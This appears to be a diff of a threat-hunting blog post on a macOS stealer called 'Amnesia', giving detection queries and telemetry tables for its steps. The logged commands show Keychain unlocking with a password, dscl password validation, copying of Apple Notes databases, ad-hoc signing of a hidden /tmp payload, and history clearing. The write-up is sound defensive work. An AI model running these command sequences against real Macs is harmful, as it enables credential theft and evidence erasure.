+			</tr>
+	</tbody>
+</table>
+<p>The second event is particularly interesting because the staged payload itself becomes the parent of the command deleting its quarantine attribute.</p>
+<p><code>xattr</code> is commonly used by developers and administrators. The target path, parent process and surrounding download/execution activity are therefore important when triaging results.</p>
+<hr>
 
-<h3 class="relative group">Keychain unlocking from the command line
-    <div id="keychain-unlocking-from-the-command-line" class="anchor"></div>
+<h3 class="relative group">Ad-Hoc Code Signing
+    <div id="ad-hoc-code-signing" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#keychain-unlocking-from-the-command-line" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ad-hoc-code-signing" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">event.category : &#34;process&#34;
-</span></span><span class="line"><span class="cl">and process.name : &#34;security&#34;
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;unlock-keychain&#34;*</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>The event becomes much more interesting when:</p>
-<ul>
-<li>a password is passed directly with <code>-p</code>;</li>
-<li>the target is <code>login.keychain-db</code>;</li>
-<li>the parent is an unknown executable;</li>
-<li>or the process originates from <code>/tmp</code>.</li>
-</ul>
-<p>I would correlate this with file access to:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">~/Library/Keychains/login.keychain-db</span></span></code></pre></div></div>
-<p>and any browser Safe Storage or credential collection activity around the same time.</p>
-<p><strong>Common false positives</strong></p>
-<p>Developer build pipelines, signing workflows, CI systems and automation may legitimately unlock Keychains from the command line. The target Keychain, account, parent process and whether a plaintext password is exposed in the command line are important context.</p>
+<p>The staged payload was forcibly and recursively ad-hoc signed:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">codesign --force --deep --sign - /tmp/.com.apple.dt.77002</span></span></code></pre></div></div>
+<p><strong>Hunting hypothesis:</strong> Ad-hoc signing of newly created objects beneath temporary or user-writable locations may indicate payload preparation.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/codesign&#34; and process.command_line : *--force* and process.command_line : *--deep* and process.command_line : *--sign*</code></pre></div>
 
-<h3 class="relative group">Direct access to credential and user-data stores
-    <div id="direct-access-to-credential-and-user-data-stores" class="anchor"></div>
+<h4 class="relative group">Result
+    <div id="result-3" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#direct-access-to-credential-and-user-data-stores" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-3" aria-label="Anchor">#</a>
     </span>
     
-</h3>
-<p>File telemetry provides another hunting surface:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">event.category : &#34;file&#34;
-</span></span><span class="line"><span class="cl">and (
-</span></span><span class="line"><span class="cl">  file.path : *&#34;login.keychain-db&#34;* or
-</span></span><span class="line"><span class="cl">  file.path : *&#34;Login Data&#34;* or
-</span></span><span class="line"><span class="cl">  file.path : *&#34;Cookies&#34;* or
-</span></span><span class="line"><span class="cl">  file.path : *&#34;NoteStore.sqlite&#34;*
-</span></span><span class="line"><span class="cl">) and (event.type : &#34;access&#34; or event.type : &#34;change&#34;)</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>Focus on the process performing the access. Typically, you would whitelist browsers that are accessing browser related data.</p>
-<p>For example:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Safari reading Safari data</span></span></code></pre></div></div>
-<p>is expected.</p>
-<p>A hidden executable under <code>/private/tmp</code> reading:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">login.keychain-db
-</span></span><span class="line"><span class="cl">NoteStore.sqlite
-</span></span><span class="line"><span class="cl">browser credential databases</span></span></code></pre></div></div>
-<p>is very different.</p>
-<p>The event is also more interesting if the same process later creates a staging directory or archive.</p>
-<p><strong>Common false positives</strong></p>
-<p>Browsers, backup software, indexing services, migration utilities, password managers and security software may legitimately access these files. Allowlisting known processes is likely necessary in larger environments.</p>
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:45.751</td>
+					<td><code>/usr/bin/codesign</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>codesign --force --deep --sign - /tmp/.com.apple.dt.77002</code></td>
+					<td><code>bash</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>The <code>--sign -</code> argument performs ad-hoc signing. It does not make the application notarized or trusted by Gatekeeper.</p>
+<p>Development systems and CI/CD environments may generate significant <code>codesign</code> activity. Here, the interesting context is that a hidden object beneath <code>/tmp</code> was downloaded, had its extended attributes manipulated and was then ad-hoc signed.</p>
+<hr>
 
-<h3 class="relative group">APFS snapshot creation and mounting
-    <div id="apfs-snapshot-creation-and-mounting" class="anchor"></div>
+<h3 class="relative group">Cleanup and Anti-Forensics
+    <div id="cleanup-and-anti-forensics" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#apfs-snapshot-creation-and-mounting" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cleanup-and-anti-forensics" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<p>The <code>tmutil</code> and <code>mount_apfs</code> sequence was one of the more unusual behaviors in the dataset:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">event.category : &#34;process&#34;
-</span></span><span class="line"><span class="cl">and (
-</span></span><span class="line"><span class="cl">  process.name : &#34;tmutil&#34; or
-</span></span><span class="line"><span class="cl">  process.name : &#34;mount_apfs&#34;
-</span></span><span class="line"><span class="cl">)</span></span></code></pre></div></div>
-<p>A more focused version is:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">process.name : &#34;mount_apfs&#34;
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;-s&#34;*
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;/tmp/&#34;*</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>A sequence like this is worth investigating:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">tmutil localsnapshot
-</span></span><span class="line"><span class="cl">        ↓
-</span></span><span class="line"><span class="cl">sudo -S mount_apfs -s &lt;snapshot&gt;
-</span></span><span class="line"><span class="cl">        ↓
-</span></span><span class="line"><span class="cl">snapshot mounted under /tmp</span></span></code></pre></div></div>
-<p>The signal becomes stronger when:</p>
-<ul>
-<li>the mount point is hidden, such as <code>.snap_*</code>;</li>
-<li><code>-o nobrowse</code> is used;</li>
-<li>the parent is an unknown executable;</li>
-<li>or the mounted snapshot is followed by access to browser, Notes, Keychain or other protected data.</li>
-</ul>
-<p><strong>Common false positives</strong></p>
-<p>Backup products, forensic tools, administrators and troubleshooting utilities may legitimately interact with APFS snapshots. This should still be a relatively low-volume behavior in many enterprise environments, but it needs contextual validation before being treated as malicious.</p>
+<p>Amnesia removed several temporary artifacts after they were no longer required and also attempted to clear shell history.</p>
+<p><strong>Hunting hypothesis:</strong> Forced deletion of hidden temporary files or attempts to clear shell history may indicate payload cleanup or anti-forensic activity.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and (((process.executable : &#34;/bin/rm&#34;) and process.command_line : *-f* and (process.command_line : */tmp/.* or process.command_line : */private/tmp/.*)) or process.command_line : *history -c*)</code></pre></div>
 
-<h3 class="relative group">Temporary collection and archive creation
-    <div id="temporary-collection-and-archive-creation" class="anchor"></div>
+<h4 class="relative group">Result
+    <div id="result-4" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#temporary-collection-and-archive-creation" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-4" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:45.406</td>
+					<td><code>/bin/rm</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>rm -f /tmp/._77002.zip</code></td>
+					<td><code>bash</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:47.877</td>
+					<td><code>/bin/rm</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>rm -f /tmp/.com.apple.dt.77002</code></td>
+					<td><code>bash</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:51:22.014</td>
+					<td><code>/bin/sh</code></td>
+					<td><code>[fork, exec]</code></td>
+					<td><code>sh -c history -c 2&gt;/dev/null; true</code></td>
+					<td><code>/tmp/.com.apple.dt.77002</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:51:22.014</td>
+					<td><code>/bin/bash</code></td>
+					<td><code>[exec, end]</code></td>
+					<td><code>sh -c history -c 2&gt;/dev/null; true</code></td>
+					<td><code>/tmp/.com.apple.dt.77002</code></td>
+			</tr>
+	</tbody>
+</table>
+<p><code>rm -f</code> and output redirection to <code>/dev/null</code> are extremely common. The stronger signal is the surrounding context: a temporary payload deleting recently created artifacts and spawning a shell to attempt history cleanup.</p>
+<p>The <code>history -c</code> event shows an apparent cleanup attempt, but does not prove that the user&rsquo;s persistent shell-history file was successfully erased.</p>
+<hr>
+
+<h3 class="relative group">Apple Notes Collection and Staging
+    <div id="apple-notes-collection-and-staging" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#apple-notes-collection-and-staging" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">event.category : &#34;process&#34;
-</span></span><span class="line"><span class="cl">and process.name : (
-</span></span><span class="line"><span class="cl">  &#34;ditto&#34; or
-</span></span><span class="line"><span class="cl">  &#34;zip&#34; or
-</span></span><span class="line"><span class="cl">  &#34;tar&#34;
-</span></span><span class="line"><span class="cl">)
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;/tmp/&#34;*</span></span></code></pre></div></div>
-<p>For <code>ditto</code>, a more focused hunt is:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">process.name : &#34;ditto&#34;
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;-c&#34;*
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;-k&#34;*
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;/tmp/&#34;*</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>Look for archives created from temporary directories shortly after:</p>
-<ul>
-<li>Keychain access;</li>
-<li>browser credential access;</li>
-<li>Notes access;</li>
-<li>file collection;</li>
-<li>or host enumeration.</li>
-</ul>
-<p>A useful sequence is:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sensitive data access
-</span></span><span class="line"><span class="cl">      ↓
-</span></span><span class="line"><span class="cl">staging under /tmp
-</span></span><span class="line"><span class="cl">      ↓
-</span></span><span class="line"><span class="cl">archive creation
-</span></span><span class="line"><span class="cl">      ↓
-</span></span><span class="line"><span class="cl">network activity
-</span></span><span class="line"><span class="cl">      ↓
+<p>Amnesia targeted the Apple Notes SQLite database and its associated WAL and SHM files.</p>
+<p><strong>Hunting hypothesis:</strong> Unexpected command-line utilities reading Apple Notes databases may indicate collection of locally stored Notes data.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and (process.executable : &#34;/bin/cp&#34; or process.executable : &#34;/bin/cat&#34;) and (process.command_line : *group.com.apple.notes* or process.command_line : *NoteStore.sqlite*)</code></pre></div>
+
+<h4 class="relative group">Process Result
+    <div id="process-result" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#process-result" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:31.652</td>
+					<td><code>/bin/cat</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite</code></td>
+					<td><code>sh -c cat '/Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite' 2&gt;/dev/null</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:31.921</td>
+					<td><code>/bin/cat</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite</code></td>
+					<td><code>sudo -S cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:31.962</td>
+					<td><code>/bin/cat</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm</code></td>
+					<td><code>sh -c cat '/Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm' 2&gt;/dev/null</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:32.019</td>
+					<td><code>/bin/cat</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm</code></td>
+					<td><code>sudo -S cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:32.084</td>
+					<td><code>/bin/cat</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal</code></td>
+					<td><code>sh -c cat '/Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal' 2&gt;/dev/null</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:32.116</td>
+					<td><code>/bin/cat</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal</code></td>
+					<td><code>sudo -S cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>The hunt shows all three SQLite components being read. The WAL file is particularly relevant because recent database changes may not yet exist only in the primary SQLite database.</p>
+<p>A follow-up file hunt looked for related Notes artifacts:</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;file&#34; and file.path : *NoteStore*</code></pre></div>
+
+<h4 class="relative group">File Result
+    <div id="file-result" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#file-result" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>event.type</th>
+					<th>process.executable</th>
+					<th style="text-align: right">process.parent.pid</th>
+					<th style="text-align: right">process.pid</th>
+					<th>file.path</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:31.948</td>
+					<td><code>deletion</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+					<td><code>/private/tmp/_notes_tmp_NoteStore.sqlite</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:32.077</td>
+					<td><code>deletion</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+					<td><code>/private/tmp/_notes_tmp_NoteStore.sqlite-shm</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:32.131</td>
+					<td><code>deletion</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+					<td><code>/private/tmp/_notes_tmp_NoteStore.sqlite-wal</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>The file telemetry did not provide the original read/open event against the Notes database, but it independently exposed temporary staged copies being deleted.</p>
+<p>Together, the two telemetry sources give us:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Notes database read
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">SQLite + WAL + SHM collection
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">temporary staging
+</span></span><span class="line"><span class="cl">    ↓
 </span></span><span class="line"><span class="cl">cleanup</span></span></code></pre></div></div>
-<p>Randomly named staging directories are also useful context.</p>
-<p><strong>Common false positives</strong></p>
-<p>Installers, software update frameworks, packaging systems, development tools and support scripts frequently create archives under <code>/tmp</code>. The source directory contents, parent process and immediate follow-on network activity are what make the event more interesting.</p>
+<hr>
 
-<h3 class="relative group">LaunchDaemon and LaunchAgent writes
-    <div id="launchdaemon-and-launchagent-writes" class="anchor"></div>
+<h3 class="relative group">Host and System Discovery
+    <div id="host-and-system-discovery" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#launchdaemon-and-launchagent-writes" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#host-and-system-discovery" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<p>A broad persistence hunt is:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">event.category : &#34;file&#34; and (
-</span></span><span class="line"><span class="cl">  file.path : &#34;/Library/LaunchDaemons/*&#34; or
-</span></span><span class="line"><span class="cl">  file.path : &#34;/Library/LaunchAgents/*&#34; or
-</span></span><span class="line"><span class="cl">  file.path : &#34;/Users/*/Library/LaunchAgents/*&#34;
-</span></span><span class="line"><span class="cl">)</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>The plist itself is only part of the story.</p>
-<p>I would inspect:</p>
+<p>Amnesia profiles the infected Mac using native utilities such as <code>ioreg</code>, <code>sw_vers</code> and <code>system_profiler</code>.</p>
+<p><strong>Hunting hypothesis:</strong> Rapid execution of several native macOS discovery utilities under the same unusual parent may indicate automated host profiling.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and (process.executable : &#34;/usr/sbin/ioreg&#34; or process.executable : &#34;/usr/bin/sw_vers&#34; or process.executable : &#34;/usr/sbin/system_profiler&#34; or (((process.executable : &#34;/bin/sh&#34; or process.executable : &#34;/bin/bash&#34; or process.executable : &#34;/bin/zsh&#34;)) and (process.command_line : *ioreg* or process.command_line : *sw_vers* or process.command_line : *system_profiler*)))</code></pre></div>
+
+<h4 class="relative group">Result
+    <div id="result-5" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-5" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The hunt returned activity for <code>ioreg</code>, <code>sw_vers</code> and <code>system_profiler</code> within the same discovery window.</p>
+<p>One of the visible <code>system_profiler</code> events was:</p>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:58.631</td>
+					<td><code>/usr/sbin/system_profiler</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>/usr/sbin/system_profiler -nospawn -xml SPSoftwareDataType -detailLevel full</code></td>
+					<td><code>system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>These utilities are normal on macOS. The more useful signal is several discovery commands appearing within seconds under the same unexpected execution chain.</p>
+<p>MDM platforms, inventory agents, troubleshooting tools and administrative scripts are likely sources of legitimate noise.</p>
+<hr>
+
+<h3 class="relative group">Password Validation With <code>dscl</code>
+    <div id="password-validation-with-dscl" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#password-validation-with-dscl" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Amnesia prompted the user for their login password and then validated the supplied credential locally using <code>dscl</code>.</p>
+<p>A related hunt for AppleScript-based credential prompts was also tested:</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/osascript&#34; and process.command_line : *display dialog*</code></pre></div>
+<p><strong>Result: No matching events.</strong></p>
+<p>This does not mean no credential prompt occurred. In this execution, Amnesia used a native prompt rather than spawning <code>osascript</code>.</p>
+<p>The follow-up credential-validation behavior was visible:</p>
+<p><strong>Hunting hypothesis:</strong> Unexpected use of <code>dscl -authonly</code> may indicate programmatic validation of a captured local password.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/dscl&#34; and process.command_line : *authonly*</code></pre></div>
+
+<h4 class="relative group">Result
+    <div id="result-6" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-6" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:52.592</td>
+					<td><code>/usr/bin/dscl</code></td>
+					<td><code>[exec, end]</code></td>
+					<td><code>dscl /Local/Default -authonly jason &lt;redacted&gt;</code></td>
+					<td><code>/tmp/.com.apple.dt.77002</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>The supplied password appeared directly inside process command-line telemetry and has therefore been redacted.</p>
+<p>Unexpected applications using <code>dscl -authonly</code>, especially when the parent originates from a temporary location, are worth investigating.</p>
+<hr>
+
+<h3 class="relative group">Keychain Unlocking and Direct Access
+    <div id="keychain-unlocking-and-direct-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#keychain-unlocking-and-direct-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>After obtaining and validating the password, Amnesia attempted to unlock the user&rsquo;s login Keychain.</p>
+<p><strong>Hunting hypothesis:</strong> Unexpected use of <code>security unlock-keychain</code>, particularly with a password passed through <code>-p</code>, may indicate programmatic credential access.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/security&#34; and process.command_line : *unlock-keychain*</code></pre></div>
+
+<h4 class="relative group">Result
+    <div id="result-7" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-7" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:51:17.419</td>
+					<td><code>/usr/bin/security</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>security unlock-keychain -p &lt;redacted&gt; /Users/jason/Library/Keychains/login.keychain-db</code></td>
+					<td><code>/tmp/.com.apple.dt.77002</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>Again, the supplied password was visible in the process command line and has been redacted.</p>
+<p>The next hunt looked for processes other than <code>/usr/bin/security</code> directly accessing the login Keychain database:</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;file&#34; and file.path : *login.keychain* and event.type : &#34;access&#34; and not process.executable : &#34;/usr/bin/security&#34;</code></pre></div>
+
+<h4 class="relative group">Direct Keychain Access
+    <div id="direct-keychain-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#direct-keychain-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The hunt returned 25 access events. The first visible events were:</p>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>event.type</th>
+					<th>process.executable</th>
+					<th style="text-align: right">process.parent.pid</th>
+					<th style="text-align: right">process.pid</th>
+					<th>file.path</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:53.122</td>
+					<td><code>access</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+					<td><code>/Users/jason/Library/Keychains/login.keychain-db</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:53.427</td>
+					<td><code>access</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+					<td><code>/Users/jason/Library/Keychains/login.keychain-db</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:53.728</td>
+					<td><code>access</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+					<td><code>/Users/jason/Library/Keychains/login.keychain-db</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:54.035</td>
+					<td><code>access</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+					<td><code>/Users/jason/Library/Keychains/login.keychain-db</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:54.336</td>
+					<td><code>access</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+					<td><code>/Users/jason/Library/Keychains/login.keychain-db</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:54.642</td>
+					<td><code>access</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14486</code></td>
+					<td style="text-align: right"><code>14499</code></td>
